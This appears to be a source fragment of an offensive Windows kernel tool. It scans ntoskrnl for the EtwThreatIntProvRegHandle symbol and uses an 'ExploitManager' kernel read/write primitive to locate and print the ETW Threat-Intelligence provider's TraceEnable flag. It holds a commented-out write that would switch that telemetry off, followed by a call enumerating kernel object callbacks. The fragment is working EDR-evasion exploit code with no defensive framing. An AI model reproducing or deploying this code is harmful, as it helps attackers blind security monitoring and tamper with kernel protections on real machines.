	for (int i = 0; i < 100; i++) {
		if ((((PBYTE)pSymbol)[i] == 0x48) && (((PBYTE)pSymbol)[i + 1] == 0x8B) && (((PBYTE)pSymbol)[i + 2] == 0x0D)) {
			distance = *(PDWORD)((DWORD_PTR)pSymbol + i + 3);
			pSymbol = (LPVOID)((DWORD_PTR)pSymbol + i + distance + 7);
			break;
		}
	}

	//TODO Add PDB Loaded Symbol for nt!EtwThreatIntProvRegHandle to get rid of the memory scan
	DWORD_PTR symbolOffset = (DWORD)pSymbol - (DWORD)Ntoskrnl;
	unsigned long long ntEtwThreatIntProvRegHandleAddress = ntoskrnlBaseAddress + symbolOffset;
	unsigned long long buffer[16];
	ExploitManager->VirtualRead(ntEtwThreatIntProvRegHandleAddress, &buffer, 8);
	ExploitManager->VirtualRead(*buffer + 0x20, &buffer, 8);
	unsigned long long traceEnableAddress = *buffer + 0x60;
	ExploitManager->VirtualRead(*buffer + 0x60, &buffer, 8);
	printf("[+] TraceEnableAddress: 0x%llx\n", traceEnableAddress);
	printf("[+] TraceEnableStatus: 0x%llx\n", *buffer);

	unsigned long long enable[2];
	unsigned long long disable[2];
	enable[0] = 1; enable[1] = 0;
	disable[0] = 0; disable[1] = 0;

	//ExploitManager->VirtualWrite(traceEnableAddress, disable, 8);

	EnumAllObjectsCallbacks(ExploitManager, ntoskrnlBaseAddress);

}
